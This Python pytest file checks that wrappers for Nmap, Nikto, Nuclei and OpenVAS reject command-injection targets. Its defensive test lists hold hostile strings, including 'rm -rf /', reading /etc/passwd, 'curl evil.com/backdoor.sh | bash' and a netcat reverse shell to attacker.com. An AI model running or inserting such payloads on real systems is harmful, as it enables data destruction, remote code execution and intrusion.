"""
Security Integration Tests for Adapters

Tests that all adapters properly reject malicious inputs and use safe command construction.
These tests verify Issue #1 (Command Injection Prevention) is properly fixed.

Author: QA Security Team
Date: 2025-10-30
"""

import pytest
import sys
from pathlib import Path

# Add backend to path
backend_dir = Path(__file__).parent.parent
sys.path.insert(0, str(backend_dir))

from services.adapters.nmap_adapter import NmapAdapter
from services.adapters.nikto_adapter import NiktoAdapter
from services.adapters.nuclei_adapter import NucleiAdapter
from services.adapters.openvas_adapter import OpenVASAdapter
from utils.wsl_helper import WSLHelper


class MockWSLHelper:
    """Mock WSL helper for testing without actual WSL execution"""

    def __init__(self, distribution="kali-linux"):
        self.distribution = distribution
        self.last_command = None

    def check_tool_availability(self, tool_name: str) -> bool:
        """Mock tool availability check"""
        return True

    def get_tool_version(self, tool_name: str, version_flag: str) -> str:
        """Mock version check"""
        return f"{tool_name} version 1.0.0"

    def execute_command(self, command: str, timeout: int = 300, check_success: bool = True):
        """Mock command execution - capture command for testing"""
        self.last_command = command

        class MockResult:
            def __init__(self, cmd):
                self.success = True
                self.stdout = "<mock output>"
                self.stderr = ""
                self.command = cmd

        return MockResult(command)


class TestNmapAdapterSecurity:
    """Security tests for Nmap adapter"""

    def setup_method(self):
        """Setup for each test"""
        self.wsl_helper = MockWSLHelper()
        self.adapter = NmapAdapter(wsl_helper=self.wsl_helper)

    def test_nmap_rejects_command_injection_in_target(self):
        """Test that Nmap adapter rejects command injection in target"""
        malicious_targets = [
            "192.168.1.1; rm -rf /",
            "192.168.1.1 && cat /etc/passwd",
            "192.168.1.1 | nc attacker.com 1234",
            "192.168.1.1`whoami`",
            "192.168.1.1$(curl evil.com)",
            "192.168.1.1\nwhoami",
        ]

        for target in malicious_targets:
            with pytest.raises((ValueError, Exception)):
                self.adapter.build_command(target, "basic", {})

    def test_nmap_safe_command_construction(self):
        """Test that Nmap uses safe array-based command construction"""
        safe_target = "192.168.1.1"
        command = self.adapter.build_command(safe_target, "basic", {})

        # Command should be constructed safely using WSLCommandValidator
        # It should NOT contain shell metacharacters from unsafe string concatenation
        assert command is not None
        assert "192.168.1.1" in command
        assert "wsl.exe" in command.lower() or "kali-linux" in command.lower()

    def test_nmap_handles_special_characters_safely(self):
        """Test that Nmap handles special characters in options safely"""
        # Test with ports containing special characters (should be validated)
        result = self.adapter.build_command(
            "192.168.1.1", 
            "basic", 
            {"ports": "80,443"}  # Valid
        )
        assert result is not None

        # Test malicious port specification
        with pytest.raises((ValueError, Exception)):
            self.adapter.build_command(
                "192.168.1.1",
                "basic",
                {"ports": "80; rm -rf /"}  # Invalid
            )


class TestNiktoAdapterSecurity:
    """Security tests for Nikto adapter"""

    def setup_method(self):
        """Setup for each test"""
        self.wsl_helper = MockWSLHelper()
        self.adapter = NiktoAdapter(wsl_helper=self.wsl_helper)

    def test_nikto_rejects_command_injection_in_target(self):
        """Test that Nikto adapter rejects command injection in target"""
        malicious_targets = [
            "http://example.com; curl evil.com/backdoor.sh | bash",
            "http://example.com && wget attacker.com/malware",
            "http://example.com`id`",
            "http://example.com$(whoami)",
        ]

        for target in malicious_targets:
            # The validator should catch this when build_command is called
            with pytest.raises((ValueError, Exception)):
                self.adapter.build_command(target, "basic", {})

    def test_nikto_safe_command_construction(self):
        """Test that Nikto uses safe array-based command construction"""
        safe_target = "http://example.com"
        command = self.adapter.build_command(safe_target, "basic", {})

        # Command should use WSLCommandValidator
        assert command is not None
        assert "example.com" in command
        assert "nikto" in command

    def test_nikto_sanitizes_options(self):
        """Test that Nikto sanitizes user-provided options"""
        # Valid options should work
        result = self.adapter.build_command(
            "http://example.com",
            "basic",
            {"port": 8080, "ssl": True}
        )
        assert result is not None

        # Malicious options should be rejected or sanitized
        # The port should be converted to string safely
        result = self.adapter.build_command(
            "http://example.com",
            "basic",
            {"port": 443}
        )
        assert result is not None


class TestNucleiAdapterSecurity:
    """Security tests for Nuclei adapter"""

    def setup_method(self):
        """Setup for each test"""
        self.wsl_helper = MockWSLHelper()
        self.adapter = NucleiAdapter(wsl_helper=self.wsl_helper)

    def test_nuclei_rejects_command_injection_in_target(self):
        """Test that Nuclei adapter rejects command injection in target"""
        malicious_targets = [
            "http://example.com; nc -e /bin/bash attacker.com 4444",
            "http://example.com && echo hacked",
            "http://example.com | tee /tmp/output",
        ]

        for target in malicious_targets:
            with pytest.raises((ValueError, Exception)):
                self.adapter.build_command(target, "basic", {})

    def test_nuclei_safe_command_construction(self):
        """Test that Nuclei uses safe array-based command construction"""
        safe_target = "http://example.com"
        command = self.adapter.build_command(safe_target, "basic", {})

        # Command should use WSLCommandValidator
        assert command is not None
        assert "example.com" in command
        assert "nuclei" in command

    def test_nuclei_sanitizes_severity_tags(self):
        """Test that Nuclei sanitizes severity and tags options"""
        # Valid severity should work
        result = self.adapter.build_command(
            "http://example.com",
            "custom",
            {"severity": "critical,high", "tags": "cve"}
        )
        assert result is not None

        # Options are converted to strings safely
        result = self.adapter.build_command(
            "http://example.com",
            "custom",
            {"rate_limit": 100}
        )
        assert result is not None


class TestOpenVASAdapterSecurity:
    """Security tests for OpenVAS adapter"""

    def setup_method(self):
        """Setup for each test"""
        self.wsl_helper = MockWSLHelper()
        self.adapter = OpenVASAdapter(wsl_helper=self.wsl_helper)

    def test_openvas_rejects_command_injection_in_target(self):
        """Test that OpenVAS adapter rejects command injection in target"""
        malicious_targets = [
            "192.168.1.1; python3 -c 'import os; os.system(\"whoami\")'",
            "192.168.1.1 && rm -rf /tmp/*",
            "192.168.1.1`curl evil.com`",
        ]

        for target in malicious_targets:
            with pytest.raises((ValueError, Exception)):
                self.adapter.build_command(target, "basic", {})

    def test_openvas_safe_command_construction(self):
        """Test that OpenVAS uses safe array-based command construction"""
        safe_target = "192.168.1.1"
        command = self.adapter.build_command(safe_target, "basic", {})

        # Command should use WSLCommandValidator with array-based construction
        assert command is not None
        assert "192.168.1.1" in command
        assert "python3" in command

    def test_openvas_safe_parameter_passing(self):
        """Test that OpenVAS passes parameters safely to Python script"""
        safe_target = "192.168.1.10"
        command = self.adapter.build_command(safe_target, "full", {})

        # Parameters should be passed as separate array elements, not concatenated
        assert command is not None
        assert "192.168.1.10" in command
        # Should NOT see quote escaping issues or shell metacharacters


class TestCrossCuttingSecurity:
    """Cross-cutting security tests for all adapters"""

    def test_all_adapters_use_wsl_validator(self):
        """Test that all adapters use WSLCommandValidator"""
        wsl_helper = MockWSLHelper()

        adapters = [
            NmapAdapter(wsl_helper=wsl_helper),
            NiktoAdapter(wsl_helper=wsl_helper),
            NucleiAdapter(wsl_helper=wsl_helper),
            OpenVASAdapter(wsl_helper=wsl_helper),
        ]

        safe_targets = {
            NmapAdapter: "192.168.1.1",
            NiktoAdapter: "http://example.com",
            NucleiAdapter: "http://example.com",
            OpenVASAdapter: "192.168.1.1",
        }

        for adapter in adapters:
            target = safe_targets[type(adapter)]
            command = adapter.build_command(target, "basic", {})

            # All commands should be constructed via WSLCommandValidator
            # which ensures they start with wsl.exe
            assert command is not None
            assert len(command) > 0

    def test_no_shell_metacharacters_in_safe_commands(self):
        """Test that safe commands don't contain unescaped shell metacharacters"""
        wsl_helper = MockWSLHelper()

        test_cases = [
            (NmapAdapter(wsl_helper=wsl_helper), "192.168.1.1", "basic"),
            (NiktoAdapter(wsl_helper=wsl_helper), "http://example.com", "basic"),
            (NucleiAdapter(wsl_helper=wsl_helper), "http://example.com", "basic"),
            (OpenVASAdapter(wsl_helper=wsl_helper), "192.168.1.1", "basic"),
        ]

        for adapter, target, scan_type in test_cases:
            command = adapter.build_command(target, scan_type, {})

            # The command should use proper escaping/quoting
            # WSLCommandValidator should handle shell metacharacters safely
            assert command is not None


class TestInputValidationIntegration:
    """Test integration with input validation module"""

    def test_scan_orchestrator_validates_before_adapter(self):
        """Test that scan orchestrator validates inputs before calling adapters"""
        from utils.input_validation import (
            IPAddressValidator,
            WSLCommandValidator,
            CommandSanitizer,
            ValidationError
        )

        # Valid target should pass
        try:
            IPAddressValidator.validate_target("192.168.1.1")
            WSLCommandValidator.validate_tool("nmap")
            CommandSanitizer.validate_scan_type("basic")
            # If no exceptions, validation passed
            assert True
        except ValidationError:
            assert False, "Valid inputs should not raise ValidationError"

    def test_invalid_scan_requests_rejected(self):
        """Test that invalid scan requests are rejected at validation layer"""
        from utils.input_validation import (
            IPAddressValidator,
            WSLCommandValidator,
            CommandSanitizer,
            ValidationError
        )

        # Malicious target
        with pytest.raises(ValidationError):
            IPAddressValidator.validate_target("192.168.1.1; rm -rf /")

        # Invalid tool
        with pytest.raises(ValidationError):
            WSLCommandValidator.validate_tool("malicious_tool")

        # Null bytes in target
        with pytest.raises(ValidationError):
            IPAddressValidator.validate_target("192.168.1.1\x00malicious")


if __name__ == "__main__":
    pytest.main([__file__, "-v", "--tb=short"])
